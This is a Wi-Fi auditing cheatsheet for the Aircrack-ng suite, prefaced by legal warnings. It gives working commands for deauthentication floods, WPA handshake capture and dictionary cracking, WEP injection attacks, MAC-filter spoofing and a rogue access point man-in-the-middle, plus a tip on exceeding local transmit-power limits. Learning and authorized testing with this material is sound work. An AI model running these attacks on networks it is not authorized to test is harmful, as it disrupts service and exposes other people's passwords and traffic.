# Aircrack-ng Suite Wi-Fi Auditing Cheatsheet

## CRITICAL WARNING: ETHICAL AND LEGAL USE ONLY

**PURPOSE OF THIS DOCUMENT: STRICTLY EDUCATIONAL & AUTHORIZED AUDITING**

The Aircrack-ng suite is a powerful set of tools designed for Wi-Fi network security auditing. The commands and techniques described in this document can be used to assess network security, identify vulnerabilities, and recover lost Wi-Fi passwords **for networks you own or have explicit, written authorization to test.**

**ILLEGAL AND UNETHICAL USE IS PROHIBITED:**
-   **DO NOT USE THESE TOOLS OR TECHNIQUES ON ANY WIRELESS NETWORK FOR WHICH YOU DO NOT HAVE EXPLICIT, WRITTEN PERMISSION FROM THE NETWORK OWNER OR OPERATOR.**
-   Unauthorized attempts to access, intercept data from, disrupt, or gain control over wireless networks are **ILLEGAL** in most jurisdictions worldwide.
-   Such actions can lead to severe **CRIMINAL CHARGES, FINES, AND IMPRISONMENT.**

**YOUR RESPONSIBILITY:**
-   You are solely responsible for your actions and any consequences that arise from the use or misuse of this information.
-   This document is for educational purposes for individuals learning about Wi-Fi security, and for professionals conducting authorized security audits.
-   Misuse of this information to engage in illegal or unethical activities is strongly condemned.

**IF CONDUCTING AN AUTHORIZED AUDIT:**
-   Always ensure you have a signed, written agreement (e.g., a penetration testing contract) clearly defining the scope of your engagement.
-   Minimize disruption to services and respect the privacy of individuals during an authorized audit.

**By using the information in this cheatsheet, you acknowledge these warnings and agree to use these tools and techniques responsibly, ethically, and in strict compliance with all applicable laws and authorizations.**

---

## Introduction

The Aircrack-ng suite is a collection of tools for Wi-Fi network security auditing. It allows you to monitor Wi-Fi traffic, capture data packets, and perform various tests to assess network security, including attempts to crack WEP and WPA/WPA2-PSK keys (given proper authorization and context).

**Key Tools in the Suite (and related utilities):**
*   **`airmon-ng`**: Manages wireless card monitor mode.
*   **`airodump-ng`**: Captures raw 802.11 frames, discovers networks, and collects data.
*   **`aireplay-ng`**: Injects frames (e.g., for deauthentication, ARP replay).
*   **`aircrack-ng`**: Cracks WEP keys and WPA/WPA2-PSK passphrases.
*   **`macchanger`**: Utility to change MAC addresses (often used alongside Aircrack-ng).
*   Other tools: `airbase-ng`, `airdecap-ng`, `packetforge-ng`, `airolib-ng`, etc.

**Prerequisites:**
*   A Linux environment (natively or in a VM with USB passthrough for the wireless adapter).
*   A wireless network adapter compatible with **monitor mode** and **packet injection**. Not all adapters support this. Common chipsets like Atheros, Ralink, and some Realtek are often preferred.
*   Root privileges are typically required for most Aircrack-ng operations.

---

## Step 1: Enable Monitor Mode on Wireless Interface

<!-- Monitor mode allows your wireless card to capture all Wi-Fi traffic it can receive, not just traffic addressed to your MAC address. -->

### Using `airmon-ng` (Recommended)
```bash
# List available wireless interfaces and check for interfering processes
sudo airmon-ng check

# Kill interfering processes (e.g., NetworkManager, wpa_supplicant)
# CAUTION: This will disconnect you from any Wi-Fi networks you are currently using.
sudo airmon-ng check kill

# Start monitor mode on a specific interface (e.g., wlan0)
# This will usually create a new monitor mode interface (e.g., wlan0mon, mon0). Note the name.
sudo airmon-ng start wlan0
# If you know the channel of your target, you can specify it:
# sudo airmon-ng start wlan0 <channel>
```
<!-- Note the name of the new monitor interface (e.g., `wlan0mon`). This will be used in subsequent commands. -->

### Manual Method (Alternative, if `airmon-ng` has issues)
<!-- The original cheatsheet used this method. `airmon-ng` is generally more reliable. -->
```bash
# Replace wlan0 with your wireless interface, and wlan0mon with your desired monitor interface name.
# sudo ifconfig wlan0 down
# sudo iwconfig wlan0 mode monitor
# sudo ifconfig wlan0 up
# Verify: iwconfig wlan0 # Should show Mode:Monitor
# Note: This method might not create a separate 'mon' interface. Use the original interface name if so.
```

### Changing Wireless Adapter Properties (Optional)

#### Set Wi-Fi TX Power
<!-- WARNING: Increasing TX power beyond legal limits for your region is illegal and can interfere with other devices.
     This may also damage your hardware if set too high. Know your country's regulations. -->
```bash
# Set regulatory domain (e.g., B0 for Bolivia, which often allows higher power - CHECK YOUR LOCAL LAWS)
# sudo iw reg set B0 # Replace B0 with your appropriate country code or '00' for world mode (if allowed)
# Set TX power (e.g., 30 dBm). Max allowed power varies by region and channel.
# sudo iwconfig wlan0mon txpower 30 # Or use mW, e.g., 100mW
# Verify: iwconfig wlan0mon
```

#### Set Wi-Fi Channel
<!-- Useful if you already know the channel of your target network before starting a broad scan. -->
```bash
# sudo iwconfig wlan0mon channel <channel_number> # e.g., 6
```

---

## Step 2: Discover Networks & Targets (`airodump-ng`)

<!-- `airodump-ng` is used to scan for available wireless networks and gather information about them and their connected clients. -->

```bash
# Basic scan on the monitor interface (e.g., wlan0mon)
sudo airodump-ng wlan0mon
# This will show all nearby networks, their BSSID, ESSID, channel, encryption, etc.
# Press Ctrl+C to stop.

# Scan on specific bands (a, b, g, n)
# sudo airodump-ng --band <abg> wlan0mon # Example: --band ag

# Scan specific channels
# sudo airodump-ng --channel <channel_list> wlan0mon # Example: --channel 1,6,11

# Filter by encryption type
# sudo airodump-ng --encrypt WPA2 wlan0mon
```
**Key information to note from `airodump-ng` output for a target network:**
*   **BSSID:** The MAC address of the Access Point (AP).
*   **ESSID:** The human-readable name of the Wi-Fi network.
*   **CH:** The channel the AP is operating on.
*   **ENC:** Encryption type (WEP, WPA, WPA2, WPA3).
*   **STATION:** MAC address of a connected client (useful for capturing handshakes or specific attacks).

---

## Step 3: Capture Packets (`airodump-ng`)

<!-- Once a target is identified, use `airodump-ng` to capture packets specifically from that network. -->

### Capturing WPA/WPA2 Handshakes
<!-- A 4-way handshake is exchanged when a client connects to a WPA/WPA2 protected network.
     Capturing this handshake is necessary for cracking the PSK (Pre-Shared Key). -->
```bash
# sudo airodump-ng -c <channel> --bssid <BSSID_of_AP> -w <output_file_prefix> <monitor_interface>
#   -c <channel>: Channel of the target AP.
#   --bssid <BSSID_of_AP>: MAC address of the target AP.
#   -w <output_file_prefix>: Prefix for the files where captured data will be saved (e.g., .cap, .csv, .kismet.netxml).
#   <monitor_interface>: Your monitor mode interface (e.g., wlan0mon).
# Example:
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture_handshake wlan0mon
```
<!-- Look for "WPA handshake: <BSSID>" in the top right of `airodump-ng` output.
     You might need to force a client to re-authenticate to capture a new handshake (see Deauthentication Attack).
     The captured handshake will be in the `.cap` file (e.g., `capture_handshake-01.cap`). -->

### Capturing Packets for WEP Cracking
<!-- WEP is an old, insecure protocol. Cracking WEP relies on collecting a large number of IVs (Initialization Vectors). -->
<!-- **NOTE: WEP is considered broken and should not be used. This information is for educational context only.** -->
```bash
# sudo airodump-ng -c <channel> --bssid <BSSID_of_AP> -w <output_file_prefix> <monitor_interface>
# Example:
# sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
# Collect packets until a sufficient number of "#Data" packets (IVs) are captured (tens to hundreds of thousands may be needed).
```

---

## Step 4: Perform Specific Attacks (`aireplay-ng` - With Authorization ONLY)

<!-- `aireplay-ng` is used to inject frames, primarily to generate traffic or specific conditions for an audit. -->
<!-- **WARNING: These attacks can severely disrupt network services. Use only on networks you are explicitly authorized to test.** -->

### Deauthentication Attack (for WPA/WPA2 Handshake Capture or Disruption)
<!-- Sends deauthentication packets to a client connected to an AP, or to all clients connected to an AP.
     This forces the client(s) to disconnect and then re-authenticate, allowing `airodump-ng` to capture the new handshake.
     It can also be used as a Denial of Service attack (which is illegal without authorization). -->
```bash
# sudo aireplay-ng -0 <num_deauths> -a <BSSID_of_AP> [-c <client_MAC>] <monitor_interface>
#   -0 <num_deauths>: Number of deauthentication packets to send (0 means send continuously). Use a small number like 1-5 for handshake capture.
#   -a <BSSID_of_AP>: MAC address of the target Access Point.
#   -c <client_MAC>: (Optional) MAC address of a specific client to deauthenticate. If omitted, deauthenticates all clients from the AP (broadcast deauth).
#   <monitor_interface>: Your monitor mode interface.

# Example: Send 5 deauths to a specific client to try and capture a handshake
# (run this while `airodump-ng` is capturing on the same BSSID and channel).
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Example: Send broadcast deauths to all clients on an AP (more disruptive)
# sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon # Continuous, use Ctrl+C to stop
```

### WEP Cracking Related Attacks (Outdated - Educational Context Only)
<!-- WEP is fundamentally insecure. These attacks accelerate the collection of IVs needed to crack WEP. -->
<!-- **Given WEP's obsolescence, these are primarily for understanding historical attack vectors.** -->

#### Fake Authentication Attack (WEP)
<!-- Used to associate with an AP when no clients are connected, or if the AP uses MAC filtering and your MAC is not allowed.
     This association is often a prerequisite for other WEP attacks like ARP Replay. -->
```bash
# sudo aireplay-ng -1 <delay_ms> -e <ESSID_of_AP> -a <BSSID_of_AP> -h <your_MAC_address> <monitor_interface>
#   -1 <delay_ms>: Delay between authentication attempts (e.g., 0 for continuous, or 1000 for 1 second).
#   -e <ESSID_of_AP>: Name of the target network.
#   -a <BSSID_of_AP>: MAC address of the AP.
#   -h <your_MAC_address>: Your MAC address (or a spoofed one). Use `macchanger --show <monitor_interface>` to see yours.
# Example:
# sudo aireplay-ng -1 0 -e "MyWEPNetwork" -a 00:11:22:AA:BB:CC -h 11:22:33:44:55:66 wlan0mon
```

#### ARP Replay Attack (WEP)
<!-- Listens for an ARP packet and then re-injects it back into the network to stimulate large amounts of new IVs from the AP.
     Requires a successful association with the AP (e.g., via Fake Authentication). -->
```bash
# sudo aireplay-ng -3 -b <BSSID_of_AP> -h <your_MAC_address> <monitor_interface>
#   -3: ARP request replay attack.
#   -b <BSSID_of_AP>: MAC address of the target AP.
#   -h <your_MAC_address>: Your MAC address (must be associated).
#   -x <pps>: Packets per second for replay (e.g., 1000).
#   -n <count>: Number of packets to replay.
# Example (from original):
# sudo aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <OurMac> wlan0mon
# (Note: original used en-dashes, corrected to hyphens)
```

#### ChopChop Attack (WEP) & Packet Forging
<!-- Attempts to decrypt a WEP data packet without knowing the key, then use parts of it to forge new packets.
     This can generate ARP packets for injection if none are observed. Complex and less reliable than ARP Replay if ARPs are available. -->
```bash
# 1. Fake authenticate (if needed, see above).
# 2. ChopChop attack to get a PRGA (pseudo random generation algorithm) XOR file:
#    sudo aireplay-ng -4 -b <BSSID_of_AP> -h <your_MAC_address> <monitor_interface>
#    Follow prompts, it will save a .xor file.
# 3. Forge an ARP packet using the .xor file:
#    sudo packetforge-ng -0 -a <BSSID_of_AP> -h <your_MAC_address> -k <dest_IP> -l <source_IP> -y <path_to_xor_file> -w <output_arp_pcap_file>
#      -k <dest_IP>: Destination IP for ARP (e.g., an IP on the target network).
#      -l <source_IP>: Source IP for ARP (e.g., an IP outside the target network, or a client IP if known).
# 4. Inject the forged ARP packet:
#    sudo aireplay-ng -2 -r <output_arp_pcap_file> <monitor_interface>
```
<!-- Fragmentation attack (`aireplay-ng -5`) is similar in goal to ChopChop for WEP. -->

---

## Step 5: Crack Passwords/Keys (`aircrack-ng`)

<!-- `aircrack-ng` is the tool used to crack WEP keys or WPA/WPA2-PSK passphrases from captured data. -->

### Cracking WPA/WPA2-PSK (Dictionary Attack)
<!-- Requires a captured 4-way handshake (in a .cap file) and a wordlist. -->
```bash
# aircrack-ng -w <path_to_wordlist> -b <BSSID_of_AP> <path_to_capture_file.cap>
#   -w <path_to_wordlist>: Path to the wordlist file (one password candidate per line).
#   -b <BSSID_of_AP>: (Optional but recommended) MAC address of the target AP to focus the attack.
#   <path_to_capture_file.cap>: Path to the .cap file containing the WPA handshake.
# Example:
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture_handshake-01.cap
```
<!-- Success depends on the passphrase being in the wordlist and a valid handshake being captured.
     For stronger passphrases, dictionary attacks can be very time-consuming or infeasible. -->

### Cracking WEP Keys
<!-- Requires a .cap file with a sufficient number of captured IVs (unique data packets). -->
<!-- **WEP is insecure and easily cracked if enough data is captured. Avoid using WEP.** -->
```bash
# aircrack-ng <path_to_capture_file.cap>
# Example:
# sudo aircrack-ng wep_capture-01.cap
# `aircrack-ng` will analyze the IVs and attempt to derive the WEP key.
# If it asks to choose a target, select the BSSID of your target network.
```

### Advanced WPA/WPA2 Cracking Techniques (Brief Mention)

*   **Using John The Ripper (JTR) with `aircrack-ng`:**
    ```bash
    # john --wordlist=<wordlist> --rules --stdout | sudo aircrack-ng -e <ESSID> -w - <capture.cap>
    # This pipes JTR's generated password candidates (with rules applied) directly to aircrack-ng.
    ```
*   **Using `cowpatty` or `pyrit`:** These tools can also perform WPA/WPA2 dictionary attacks, sometimes with precomputed hashes (PMK tables) to speed up the process for common SSIDs.
    *   `cowpatty -r <capture.cap> -f <wordlist> -s <ESSID>`
    *   `pyrit -r <capture.cap> -i <wordlist> attack_passthrough`
*   **Precomputed WPA Keys Database (`airolib-ng`):**
    `airolib-ng` can be used to create a database of precomputed Pairwise Master Keys (PMKs) for specific SSIDs and passwords from a wordlist. This can significantly speed up cracking if the target SSID is in your database.
    ```bash
    # sudo airolib-ng <your_db_name> --import essid <file_with_ESSIDs_one_per_line>
    # sudo airolib-ng <your_db_name> --import passwd <path_to_wordlist>
    # sudo airolib-ng <your_db_name> --batch # Compute PMKs
    # sudo aircrack-ng -r <your_db_name> <capture_handshake.cap>
    ```

---

## Step 6: Other Auditing Techniques

### Finding Hidden SSIDs
<!-- Some networks hide their SSID (network name) from broadcasts. `airodump-ng` can often still detect them when clients are connected or through probe requests.
     A deauthentication attack can also force clients to re-associate, revealing the hidden SSID in their probe requests. -->
```bash
# 1. Start airodump-ng on the monitor interface:
#    sudo airodump-ng wlan0mon
#    Look for networks with no ESSID but with active clients or high beacon counts. Note their BSSID and channel.
#
# 2. If a client is connected to the hidden network, you can deauthenticate it to force it to re-probe:
#    (Ensure airodump-ng is running in another terminal, focused on the BSSID and channel of the hidden network)
#    sudo aireplay-ng -0 5 -a <BSSID_of_hidden_AP> -c <client_MAC_connected_to_it> wlan0mon
#    Watch the airodump-ng output for the ESSID to appear.
```

### Bypassing MAC Filtering
<!-- MAC filtering is a weak security measure where an AP only allows connections from a list of approved MAC addresses.
     It can be bypassed by spoofing an authorized MAC address. -->
```bash
# 1. Identify an authorized client's MAC address using `airodump-ng` while it's connected to the target AP.
#    (Let's say the authorized client MAC is AA:BB:CC:11:22:33)
#
# 2. Stop monitor mode on your interface if it's running, or use a different interface.
#    sudo airmon-ng stop wlan0mon
#    sudo ifconfig wlan0 down # Bring the physical interface down
#
# 3. Change your wireless card's MAC address to the authorized client's MAC:
#    sudo macchanger --mac AA:BB:CC:11:22:33 wlan0
#
# 4. Bring your interface back up:
#    sudo ifconfig wlan0 up
#    You should now be able to connect to the network as if you were the authorized client.
#
# 5. To revert to your original MAC:
#    sudo ifconfig wlan0 down
#    sudo macchanger -p wlan0 # -p for permanent (original) MAC
#    sudo ifconfig wlan0 up
```
<!-- Note: If the legitimate client with the spoofed MAC is active, it can cause network issues. Best used when the legitimate client is off. -->

### Man-in-the-Middle (MitM) Attack using Rogue AP (`airbase-ng`)
<!-- `airbase-ng` can create a soft Access Point (rogue AP), allowing you to act as a man-in-the-middle.
     This is an advanced attack with significant ethical and legal implications. **FOR AUTHORIZED TESTING ONLY.** -->
```bash
# 1. Start monitor mode on your interface (e.g., wlan0mon).
#
# 2. Create a soft AP with the same ESSID as the target network (or a tempting one like "Free_WiFi"):
#    sudo airbase-ng -e "Target_ESSID" -c <channel> wlan0mon
#    This creates a new tap interface (e.g., at0).
#
# 3. Configure the host system to bridge the tap interface (at0) with your internet-connected interface (e.g., eth0)
#    and provide DHCP services to clients connecting to your rogue AP. This is complex host-side setup.
#    Example (conceptual, requires bridge-utils, dhcp server):
#    sudo ifconfig at0 up
#    sudo brctl addbr mitm_bridge
#    sudo brctl addif mitm_bridge eth0 # Your internet-facing interface
#    sudo brctl addif mitm_bridge at0
#    sudo ifconfig eth0 0.0.0.0 up
#    sudo ifconfig mitm_bridge <your_lan_ip_for_bridge> netmask <netmask> up
#    # Configure DHCP server (e.g., isc-dhcp-server) to listen on mitm_bridge.
#
# 4. (Optional) Deauthenticate clients from the legitimate AP to encourage them to connect to yours:
#    sudo aireplay-ng -0 0 -a <BSSID_of_legitimate_AP> wlan0mon # Use different wireless card if possible, or stop airbase-ng temporarily.
#
# 5. Sniff traffic on the bridge interface (mitm_bridge) or at0 using Wireshark or tcpdump.
#    sudo wireshark -i mitm_bridge
```
<!-- This is a highly simplified overview. Real MitM attacks require careful network configuration on the host. -->

---

## Step 7: Clean Up

### Stop Monitor Mode
```bash
# Stop monitor mode on your interface (e.g., wlan0mon)
sudo airmon-ng stop wlan0mon

# Verify interface is back in managed mode
# iwconfig wlan0 # (Or your original interface name)
```

### Restore Network Services
<!-- If `airmon-ng check kill` was used, you might need to restart NetworkManager or wpa_supplicant. -->
```bash
# sudo systemctl restart NetworkManager.service
# sudo systemctl restart wpa_supplicant.service
# (Commands depend on your Linux distribution and network management tools)
```

---
<!-- Always use these tools responsibly and legally. Ignorance of the law is not an excuse. -->
<!-- For more detailed information, consult the official Aircrack-ng documentation: https://www.aircrack-ng.org/ -->
